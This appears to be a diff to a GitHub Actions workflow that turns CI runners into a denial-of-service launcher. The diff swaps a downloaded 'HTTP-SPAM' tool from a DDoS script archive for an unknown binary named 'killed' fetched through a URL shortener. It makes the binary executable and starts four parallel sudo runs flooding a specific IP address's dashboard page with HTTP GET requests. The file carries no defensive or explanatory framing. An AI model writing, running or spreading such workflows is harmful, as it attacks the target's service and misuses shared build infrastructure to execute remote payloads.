@@ -15,12 +15,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://github.com/dickriding/Ddos-Archive/raw/refs/heads/main/Ddos%20Scripts/Layer7/HTTP-SPAM/HTTP-SPAM -O HTTP-SPAM
-          wget https://curl.by/VxPAt/fres.txt -O fres.txt
-          chmod +x HTTP-SPAM
+          wget https://curl.by/ZrFop/killed -O killed
+          wget https://curl.by/DDU_6/fres.txt -O fres.txt
+          chmod +x killed
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 45 ./HTTP-SPAM GET http://185.211.100.89/dashboard/ fres.txt 45 950 10 &
+            sudo timeout 45 ./killed GET http://185.211.100.89/dashboard/ fres.txt 45 950 10 &
             PIDS+=($!)
           done
           
